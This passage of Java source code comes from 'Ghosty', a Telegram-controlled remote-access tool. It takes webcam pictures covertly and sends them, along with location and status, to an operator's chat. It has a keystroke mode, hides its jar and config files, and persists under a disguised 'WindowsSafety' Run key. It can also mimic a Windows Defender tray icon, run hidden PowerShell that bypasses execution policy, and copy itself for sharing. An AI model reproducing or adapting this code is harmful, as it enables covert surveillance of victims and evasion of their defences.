                sendNachricht("Securitymode activated! Mode: INFORM.");
            else

                sendNachricht("Securitymode activated! Mode: LOCK.");
            detct = new Detect(wasmachen, this);
            Runnable detect = detct;
            Thread runDetect = new Thread(detect);
            runDetect.start();
        }
    }

    public void changeWriting() {
        writer = !isWriter();
        if (writer) {
            PressKey k = new PressKey(this);
            Thread run = new Thread(k);
            run.start();
        }
        sendNachricht("Writing: " + writer);
    }

    public void update(File datei) throws IOException {
        if (!silentUpdate) {
            if (variables.isSilent())
                variables.setSilent(false);
            variables.setUpdated(false);
            writeConf();
        }
        File neu;
        if (getName().equalsIgnoreCase("Ghosty.jar"))
            neu = new File(getPfad() + "Ghosti.jar");
        else
            neu = new File(getPfad() + "Ghosty.jar");
        setSilent(true);
        datei.renameTo(neu);
        Desktop.getDesktop().open(neu);
        deleteme();
    }

    void retry() {
        try {
            //Runtime.getRuntime().exec("powershell /c Start-Process \"" + getAbsolutePfad() + "\" -ArgumentList restart");
            Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
            Runtime.getRuntime().exec("cmd /c start \"\" \"" + getAbsolutePfad() + "\"");
            System.exit(0);
        } catch (Exception e) {
            sendNachrichtAdmin("Fail bei retry!\nRestart");
        }

    }

    @Override
    public String getBotUsername() {
        return config.getName();
    }

    @Override
    public String getBotToken() {
        return config.getToken();
    }

    void reset() {
        variables.setReset(true);
        writeConf();
        retry();
    }

    static void removeConf() {
        File conf = new File(System.getProperty("user.home") + "\\conf.bot");
        conf.delete();
    }

    static void removeVar() {
        File conf = new File(System.getProperty("user.home") + "\\var.bot");
        conf.delete();
    }

    void deleteme() {
        try {
            Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
        } catch (IOException e) {
            sendNachrichtAdmin("Fehler beim beenden");
        }
        try {
            Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 -n 5 & attrib -h \"" + getAbsolutePfad() + "\" & del \"" + getAbsolutePfad() + "\"");
            try {
                Reg.deleteValue(Reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety");
            } catch (Exception e) {
            }
            System.exit(0);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    String getAbsolutePfad() {
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        return location.toString().substring(location.toString().indexOf('/') + 1).replaceAll("%20", " ").replaceAll("/", "\\\\");
    }

    String getPfad() {
        String name = getName();
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        String pfad = location.toString().substring(location.toString().indexOf('/') + 1).replaceAll("%20", " ");
        pfad = pfad.replaceAll(name, "");
        pfad = pfad.replaceAll("/", "\\\\");
        return pfad;
    }

    String getName() {
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        int end = 0;
        for (int i = location.toString().indexOf('.'); i > 0; i--) {
            if (location.toString().charAt(i) == '/') {
                end = i;
                break;
            }
        }
        return location.toString().substring(end + 1);
    }

    void sendNachricht(String nachricht) {
        SendMessage TestNachricht = new SendMessage();
        ReplyKeyboardMarkup back = new ReplyKeyboardMarkup();
        TestNachricht.enableMarkdown(true);
        TestNachricht.setChatId(config.getAdmin());
        String item = getItems();
        String[] buttonArray = item.split(",");
        java.util.List<KeyboardRow> commands = new ArrayList<>();
        int gseiten = (int) Math.ceil(buttonArray.length / 6.0);
        if (menu != -1) {
            for (int j = 0; j < 3; j++) {
                if (getRow(wo, j, gseiten, buttonArray).size() != 0) {
                    commands.add(getRow(wo, j, gseiten, buttonArray));
                }
            }
        } else {
            for (int j = 0; j < 2; j++) {
                if (getRow(wo, j, gseiten, buttonArray).size() != 0) {
                    commands.add(getRow(wo, j, gseiten, buttonArray));
                }
            }
        }
        back.setResizeKeyboard(true);
        back.setOneTimeKeyboard(false);
        back.setKeyboard(commands);
        back.setSelective(true);
        TestNachricht.setReplyMarkup(back);
        TestNachricht.setText(nachricht.replaceAll("(?=[]\\[+|`'{}^_~*\\\\])", "\\\\"));
        try {
            execute(TestNachricht);
        } catch (Exception e) {

        }
    }

    @SuppressWarnings("deprecated")
    void sendNachrichtAdmin(String nachricht) {
        try {
            TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
            sup = telegramBotsApi.registerBot(new SupBot("Info:" + "\n" + nachricht));
            sup.stop();
        } catch (Exception e) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e1) {
                System.out.println(e1);
            }
            sendNachrichtAdmin(nachricht);
        }
    }

    void panic() {
        sendNachricht("Ghosty has been removed sucessfully!");
        sendNachrichtAdmin("Ghosty wurde entfernt!");
        removeVar();
        removeConf();
        deleteme();
    }

    void tarnung() {
        try {
            Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 -n 60 & start \"\" \"" + getPfad() + getName() + "\"");
            Runtime.getRuntime().exec("taskkill /F /IM powershell.exe");
            try {
                Reg.deleteValue(Reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety");
            } catch (Exception e) {
            }
            System.exit(0);
        } catch (Exception e) {
            sendNachrichtAdmin("Fehler bei der Tarnung!");
        }

    }

    synchronized void takepic(boolean fast) {
        try {
            Webcam webcam = Webcam.getDefault();
            // File pic = new File("FaceDetection.png");
            //if (pic.exists())
            //  pic.delete();
            if (!fast) {
                Dimension[] nonStandardResolutions = new Dimension[]{
                        WebcamResolution.PAL.getSize(),
                        WebcamResolution.HD720.getSize(),
                        new Dimension(2000, 1000),
                        new Dimension(1000, 500),
                };
                webcam.setCustomViewSizes(nonStandardResolutions);
                webcam.setViewSize(WebcamResolution.HD720.getSize());
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            webcam.open();
            ImageIO.write(webcam.getImage(), "png", baos);
            //ImageIO.write(webcam.getImage(), "png", pic);
            webcam.close();
            InputStream is = new ByteArrayInputStream(baos.toByteArray());
            sendStream(is);
            //sendPic(pic);
            //Thread.sleep(100);
            //pic.delete();
        } catch (IOException e) {
            sendNachricht(e.toString());
            //} catch (InterruptedException e) {
            //   sendNachrichtAdmin(e.toString());
        }
    }

    void sendLocation(float lat, float lon) {
        SendLocation tes = new SendLocation();
        tes.setLatitude(lat);
        tes.setLongitude(lon);
        tes.setChatId(config.getAdmin());
        try {
            execute(tes);
        } catch (Exception e) {
            sendNachrichtAdmin(e.toString());
        }
    }

    public void sendStream(InputStream inputStream) {
        SendPhoto tes = new SendPhoto();
        tes.setPhoto("DevicePic", inputStream);
        tes.setChatId(config.getAdmin());
        try {
            execute(tes);
        } catch (Exception e) {
            sendNachrichtAdmin(e.toString());
        }
    }

    public void sendPic(File send) {
        SendPhoto tes = new SendPhoto();
        tes.setPhoto(send);
        tes.setChatId(config.getAdmin());
        try {
            execute(tes);
        } catch (Exception e) {
            sendNachrichtAdmin(e.toString());
        }
    }

    public String getItems() {
        String fun = "";
        String tools = "";
        String info = "";

        switch (menu) {
            default:
            case -1:
                if (config.isTroll())
                    return "Fun,Info,Tools,Music";
                else
                    return "Info,Tools,Music";
            case 0:
                HashMap<String, Long> funny = new HashMap<>();
                for (String k : this.fun.split(",")) {
                    funny.put(k, buttons.getOrDefault(k, 0L));
                }
                funny = sortHashMapByValues(funny);
                for (int i = funny.size() - 1; i >= 0; i--) {
                    if (i != 0)
                        fun += funny.keySet().toArray()[i] + ",";
                    else
                        fun += funny.keySet().toArray()[i];
                }
                return fun;
            case 1:
                HashMap<String, Long> informy = new HashMap<>();
                for (String k : this.info.split(",")) {
                    informy.put(k, buttons.getOrDefault(k, 0L));
                }
                informy = sortHashMapByValues(informy);
                for (int i = informy.size() - 1; i >= 0; i--) {
                    if (i != 0)
                        info += informy.keySet().toArray()[i] + ",";
                    else
                        info += informy.keySet().toArray()[i];
                }

                return info;
            case 2:
                HashMap<String, Long> toly = new HashMap<>();
                for (String k : this.tools.split(",")) {
                    toly.put(k, buttons.getOrDefault(k, 0L));
                }
                toly = sortHashMapByValues(toly);
                for (int i = toly.size() - 1; i >= 0; i--) {
                    if (i != 0)
                        tools += toly.keySet().toArray()[i] + ",";
                    else
                        tools += toly.keySet().toArray()[i];
                }
                return tools;
            case 3:
                return "Down,Un-/Mute,Up,Previous,Play/Pause,Next";
            case 100:
                return "Yes, No";
        }
    }

    private LinkedHashMap<String, Long> sortHashMapByValues(
            HashMap<String, Long> passedMap) {
        java.util.List<String> mapKeys = new ArrayList<>(passedMap.keySet());
        java.util.List<Long> mapValues = new ArrayList<>(passedMap.values());
        Collections.sort(mapValues);
        Collections.sort(mapKeys);

        LinkedHashMap<String, Long> sortedMap =
                new LinkedHashMap<>();

        Iterator<Long> valueIt = mapValues.iterator();
        while (valueIt.hasNext()) {
            Long val = valueIt.next();
            Iterator<String> keyIt = mapKeys.iterator();

            while (keyIt.hasNext()) {
                String key = keyIt.next();
                Long comp1 = passedMap.get(key);
                if (comp1.equals(val)) {
                    keyIt.remove();
                    sortedMap.put(key, val);
                    break;
                }
            }
        }
        return sortedMap;
    }

    void tray() {
        if (!config.isAlive())
            return;
        if (!SystemTray.isSupported()) {
            return;
        }
        if (systemTray == null)
            systemTray = SystemTray.getSystemTray();
        //SystemTray systemTray = SystemTray.getSystemTray();
        //get the systemTray of the system
        //get default toolkit
        //Toolkit toolkit = Toolkit.getDefaultToolkit();
        //get image
        //Toolkit.getDefaultToolkit().getImage("src/resources/busylogo.jpg");
        Image image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
        //popupmenu
        PopupMenu trayPopupMenu = new PopupMenu();
        MenuItem feedback = new MenuItem("Feedback");
        feedback.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JPanel panel = new JPanel();
                JLabel label = new JLabel("Please enter your feedback:");
                JTextArea pass = new JTextArea(5, 40);
                pass.requestFocus();
                pass.setLineWrap(true);
                pass.setWrapStyleWord(true);
                panel.add(label);
                panel.add(pass);
                panel.grabFocus();
                String[] options = new String[]{"Send", "Cancel"};
                int option = JOptionPane.showOptionDialog(null, panel, "Feedback",
                        JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                        null, options, pass);
                if (option == 0) // pressing OK button
                {
                    String send = pass.getText();
                    if (send.equals(""))
                        return;
                    sendNachrichtAdmin("Feedback:" + "\n" + send);
                    JOptionPane.showMessageDialog(null, "Thank you for your Feedback!\nOur Team will take a look at it as soon as possible.");
                }
            }
        });
        trayPopupMenu.add(feedback);
        //1t menuitem for popupmenu
        MenuItem action = new MenuItem("Version");
        action.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                double vers = 0;
                try {
                    org.jsoup.nodes.Document doc = Jsoup.connect("http://ressl.cu.cc/").get();
                    Elements bl = doc.select(".version");
                    vers = Double.parseDouble(bl.get(0).text());
                } catch (Exception e1) {

                }
                if (vers == version || vers == 0)
                    JOptionPane.showMessageDialog(null, "Version: " + version + "\nNewest Version!");
                else
                    JOptionPane.showMessageDialog(null, "Version: " + version + "\nNew Version available!\nNew Version: " + vers);
            }
        });
        trayPopupMenu.add(action);
        MenuItem update = new MenuItem("Update");
        update.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null, "No Update available!");
            }
        });
        trayPopupMenu.add(update);

        MenuItem share = new MenuItem("Share");
        share.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                share();
            }
        });
        trayPopupMenu.add(share);

        if (config.isAntiAV()) {
            MenuItem chat = new MenuItem("Chat");
            chat.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    getChat().showGui();
                }
            });
            trayPopupMenu.add(chat);
        }

        MenuItem mute = new MenuItem("Mute");
        mute.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                mute();
            }
        });
        trayPopupMenu.add(mute);


        //2nd menuitem of popupmenu
        MenuItem close = new MenuItem("Close");
        close.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JPanel panel = new JPanel();
                JLabel label = new JLabel("Please enter your password:");
                JPasswordField pass = new JPasswordField(10);
                panel.add(label);
                panel.add(pass);
                panel.grabFocus();
                String[] options = new String[]{"OK", "Cancel"};
                String pw = "";
                int option = JOptionPane.showOptionDialog(null, panel, "Password",
                        JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                        null, options, options[0]);
                if (option == 0) // pressing OK button
                {
                    char[] password = pass.getPassword();
                    pw = new String(password);
                    if (pw.equals(config.getPassword())) {
                        try {
                            Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
                        } catch (IOException ex) {
                            sendNachrichtAdmin("Fehler beim beenden");
                        }
                        System.exit(0);
                    } else {
                        sendNachricht("Warning!\nSomeone tried to kill Ghosty!");
                        takepic(true);
                    }
                }
            }
        });
        trayPopupMenu.add(close);

        //setting tray icon
        TrayIcon trayIcon = new TrayIcon(image, "Ghosty", trayPopupMenu);
        trayIcon.addMouseListener(new MouseListener() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (e.getButton() == MouseEvent.BUTTON1) {
                    try {
                        Robot click = new Robot();
                        click.mousePress(InputEvent.BUTTON3_MASK);
                        click.mouseRelease(InputEvent.BUTTON3_MASK);
                    } catch (Exception ek) {
                        System.out.println(ek);
                    }
                }
            }

            @Override
            public void mousePressed(MouseEvent e) {
                System.out.println("press");
            }

            @Override
            public void mouseReleased(MouseEvent e) {
                System.out.println("release");
            }

            @Override
            public void mouseEntered(MouseEvent e) {
                System.out.println("entered");
            }

            @Override
            public void mouseExited(MouseEvent e) {
                System.out.println("exited");
            }
        });
        trayIcon.setImageAutoSize(true);


        try {
            systemTray.add(trayIcon);
        } catch (AWTException awtException) {
            awtException.printStackTrace();
        }
    }

    void setImage(int status) {
        if (!config.isAlive() || hide)
            return;
        Image image;
        switch (status) {
            default:
            case 0:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
                break;
            case 1:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/update.gif"));
                break;
            case 2:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/received.gif"));
                break;
            case 3:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/err.gif"));
                break;
            case 4:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/unread.gif"));
                break;
            case 5:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/defender.png"));
                break;
        }
        if (systemTray.getTrayIcons().length > 0) {
            systemTray.getTrayIcons()[0].setImage(image);
        }
    }

    void setText(String text) {
        if (systemTray.getTrayIcons().length > 0)
            systemTray.getTrayIcons()[0].setToolTip(text);
    }

    void setSilent(boolean silen) {
        variables.setSilent(silen);
        variables.setLastmil(this.last);
        variables.setTime(this.time);
        writeConf();
    }

    void writeRealConf() {
        try {
            changedC = false;
            removeConf();
            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\conf.bot");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(config);
            oos.close();
            try {
                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
            } catch (IOException ek) {
                System.out.println(ek + " HIDE");
            }
        } catch (
                Exception e) {
            sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
        }
    }

    void writeConf() {
        try {
            changed = false;
            removeVar();
            variables.setButtons(buttons);
            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\var.bot");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(variables);
            oos.close();
            try {
                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\var.bot" + "\"");
            } catch (IOException ek) {
                System.out.println(ek + " HIDE");
            }
        } catch (
                Exception e) {
            sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
        }

    }

    private KeyboardRow getRow(int Seite, int Spalte, int gesamt, String[] buttonArray) {
        KeyboardRow row = new KeyboardRow();
        KeyboardRow one = new KeyboardRow();
        one.add("Leave");
        KeyboardRow firstmenu = new KeyboardRow();
        firstmenu.add("Leave");
        firstmenu.add("Forward");
        KeyboardRow lastmenu = new KeyboardRow();
        lastmenu.add("Back");
        lastmenu.add("Leave");
        KeyboardRow menu = new KeyboardRow();
        menu.add("Back");
        menu.add("Leave");
        menu.add("Forward");
        if (Spalte >= 0 && Spalte <= 1) {
            for (int i = 0; i < 3; i++) {
                try {
                    row.add(buttonArray[Seite * 6 + Spalte * 3 + i]);
                } catch (Exception e) {
                    break;
                }
            }
            return row;
        }
        if (gesamt == 1)
            return one;
        if (Seite == 0)
            return firstmenu;
        if (Seite == gesamt - 1)
            return lastmenu;

        return menu;
    }

    Config getConfig() {
        return config;
    }

    private ClientGUI getChat() {
        return chat;
    }

    boolean isUnread() {
        return unread;
    }

    public void setUnread(boolean unread) {
        if (unread)
            this.setImage(4);
        else
            this.setImage(0);
        this.unread = unread;
    }

    public boolean isWriter() {
        return writer;
    }

    public boolean isReading() {
        return reader;
    }

    public void setClient(Client client) {
        this.client = client;
    }

    void tts(String text, boolean german) { //Ghooohstie
        if (variables.isMute())
            return;
        System.out.println("Wir sind hier");
        try {
            String command = "";
            if (german)
                command = "Add-Type -AssemblyName System.speech \n" +
                        "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
                        "$speak.Speak('" + text.replaceAll("'", "") + "')";
            else
                command = "Add-Type -AssemblyName System.speech \n" +
                        "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
                        "$speak.SelectVoice('Microsoft Zira Desktop') \n" +
                        "$speak.Speak('" + text.replaceAll("'", "") + "')";
            File file = File.createTempFile("Speaky", ".ps1");
            FileWriter fw = new java.io.FileWriter(file);
            fw.write(command);
            fw.close();
            System.out.println(command);
            System.out.println("Start");
            Process k = Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
            k.waitFor();
            System.out.println("fertig");
            file.delete();
        } catch (Exception e) {
            sendNachricht("Fehler beim Restart Script.");
        }
    }

    void mute() {
        variables.setMute(!variables.isMute());
        String text;
        if (variables.isMute())
            text = "Unmute";
        else
            text = "Mute";
        systemTray.getTrayIcons()[0].getPopupMenu().getItem(5).setLabel(text);
        changed = true;
    }

    void hideIcon() {
        if (hide) {
            hide = false;
            setImage(0);
            setText("Ghosty");
        } else {
            setImage(5);
            setText("Keine Maßnahmen erforderlich!");
            hide = true;
        }
    }

    void share() {
        try {
            unhide();
            Thread.sleep(1500);
            try {
                Runtime.getRuntime().exec("cmd /c copy \"" + getAbsolutePfad() + "\" \"" + System.getProperty("user.home") + "\\Desktop\\Ghosty.jar\"");
                System.out.println("cmd /c copy \"" + getAbsolutePfad() + "\" " + System.getProperty("user.home") + "\\Desktop\\Ghosty.jar");
            } catch (IOException e) {
                sendNachricht("Fail beim copy \n" + e.toString());
            }
            hide();
            JOptionPane.showMessageDialog(null, "Ghosty has been copied to your Desktop!", "Success", JOptionPane.INFORMATION_MESSAGE);
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    private void hide() {
        try {
            Runtime.getRuntime().exec("cmd /c attrib +h \"" + getAbsolutePfad() + "\"");
        } catch (IOException e) {
            sendNachricht("FEHLER beim Datei verstecken machen \n" + e.toString());
        }
    }

    private void unhide() {
        try {
            Runtime.getRuntime().exec("cmd /c attrib -h \"" + getAbsolutePfad() + "\"");
        } catch (IOException e) {
            sendNachricht("FEHLER beim Datei verstecken machen \n" + e.toString());
        }
    }

    double getProcessCpuLoad(int counter) {
        if (counter >= 100)
            return Double.NaN;
        try {
            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
            if (counter != 0)
                Thread.sleep(100);
            ObjectName name = ObjectName.getInstance("java.lang:type=OperatingSystem");
            AttributeList list = mbs.getAttributes(name, new String[]{"SystemCpuLoad"});
            if (list.isEmpty()) return getProcessCpuLoad(counter + 1);
            Attribute att = (Attribute) list.get(0);
            Double value = (Double) att.getValue();
            if (value == -1.0) return getProcessCpuLoad(counter + 1);
            double load = ((int) (value * 1000) / 10.0);
            if (load == 0.0)
                return getProcessCpuLoad(counter + 1);
            else
                return load;
        } catch (Exception e) {
            return Double.NaN;
        }
    }

    int getRamLoad() {
        OperatingSystemMXBean osBean = ManagementFactory.getPlatformMXBean(
                OperatingSystemMXBean.class);
        long free = osBean.getFreePhysicalMemorySize();
        long total = osBean.getTotalPhysicalMemorySize();
        long use = total - free;
        return (int) ((use * 100) / total);
    }

    double getAudio() {
        double back = 0.0;
        try {
            String command = "Add-Type -TypeDefinition @'\n" +
                    "using System.Runtime.InteropServices;\n" +
                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IAudioEndpointVolume\n" +
                    "{\n" +
                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
                    "    int f(); int g(); int h(); int i();\n" +
                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
                    "    int j();\n" +
                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
                    "    int k(); int l(); int m(); int n();\n" +
                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
                    "    int GetMute(out bool pbMute);\n" +
                    "}\n" +
                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDevice\n" +
                    "{\n" +
                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
                    "}\n" +
                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDeviceEnumerator\n" +
                    "{\n" +
                    "    int f(); // Unused\n" +
                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
                    "}\n" +
                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
                    "public class Audio\n" +
                    "{\n" +
                    "    static IAudioEndpointVolume Vol()\n" +
                    "    {\n" +
                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
                    "        IMMDevice dev = null;\n" +
                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
                    "        IAudioEndpointVolume epv = null;\n" +
                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
                    "        return epv;\n" +
                    "    }\n" +
                    "    public static float Volume\n" +
                    "    {\n" +
                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "    public static bool Mute\n" +
                    "    {\n" +
                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "}\n" +
                    "'@\n" +
                    "[audio]::Volume";
            // Executing the command
            File file = File.createTempFile("Upi", ".ps1");
            FileWriter fw = new java.io.FileWriter(file);
            fw.write(command);
            fw.close();
            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
            // Getting the results
            powerShellProcess.getOutputStream().close();
            String line;
            System.out.println("Standard Output:");
            BufferedReader stdout = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getInputStream()));
            while ((line = stdout.readLine()) != null) {
                back = Double.parseDouble(line.replace(',', '.'));
            }
            stdout.close();
            System.out.println("Standard Error:");
            BufferedReader stderr = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getErrorStream()));
            while ((line = stderr.readLine()) != null) {
                System.out.println(line);
            }
            stderr.close();
            file.delete();
            System.out.println("Done");
        } catch (Exception e) {
            System.out.println(e.toString());
        }
        return back;
    }

    void audioChange(double level) {
        double current = getAudio();
        DecimalFormat df = new DecimalFormat("#.##");
        double newlevel = Double.parseDouble(df.format(current).replace(',', '.')) + level;
        try {
            String command = "Add-Type -TypeDefinition @'\n" +
                    "using System.Runtime.InteropServices;\n" +
                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IAudioEndpointVolume\n" +
                    "{\n" +
                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
                    "    int f(); int g(); int h(); int i();\n" +
                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
                    "    int j();\n" +
                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
                    "    int k(); int l(); int m(); int n();\n" +
                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
                    "    int GetMute(out bool pbMute);\n" +
                    "}\n" +
                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDevice\n" +
                    "{\n" +
                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
                    "}\n" +
                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDeviceEnumerator\n" +
                    "{\n" +
                    "    int f(); // Unused\n" +
                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
                    "}\n" +
                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
                    "public class Audio\n" +
                    "{\n" +
                    "    static IAudioEndpointVolume Vol()\n" +
                    "    {\n" +
                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
                    "        IMMDevice dev = null;\n" +
                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
                    "        IAudioEndpointVolume epv = null;\n" +
                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
                    "        return epv;\n" +
                    "    }\n" +
                    "    public static float Volume\n" +
                    "    {\n" +
                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "    public static bool Mute\n" +
                    "    {\n" +
                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "}\n" +
                    "'@\n" +
                    "[audio]::Volume = " + newlevel;
            // Executing the command
            File file = File.createTempFile("AudioUp", ".ps1");
            FileWriter fw = new java.io.FileWriter(file);
            fw.write(command);
            fw.close();
            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
            // Getting the results
            powerShellProcess.getOutputStream().close();
            String line;
            System.out.println("Standard Output:");
            BufferedReader stdout = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getInputStream()));
            while ((line = stdout.readLine()) != null) {
                System.out.println(line);
            }
            stdout.close();
            System.out.println("Standard Error:");
            BufferedReader stderr = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getErrorStream()));
            while ((line = stderr.readLine()) != null) {
                System.out.println(line);
            }
            stderr.close();
            System.out.println("Done");
            file.delete();
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }

    void audioMute(boolean mute) {
        try {
            String command = "Add-Type -TypeDefinition @'\n" +
                    "using System.Runtime.InteropServices;\n" +
                    "[Guid(\"5CDF2C82-841E-4546-9722-0CF74078229A\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IAudioEndpointVolume\n" +
                    "{\n" +
                    "    // f(), g(), ... are unused COM method slots. Define these if you care\n" +
                    "    int f(); int g(); int h(); int i();\n" +
                    "    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);\n" +
                    "    int j();\n" +
                    "    int GetMasterVolumeLevelScalar(out float pfLevel);\n" +
                    "    int k(); int l(); int m(); int n();\n" +
                    "    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);\n" +
                    "    int GetMute(out bool pbMute);\n" +
                    "}\n" +
                    "[Guid(\"D666063F-1587-4E43-81F1-B948E807363F\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDevice\n" +
                    "{\n" +
                    "    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);\n" +
                    "}\n" +
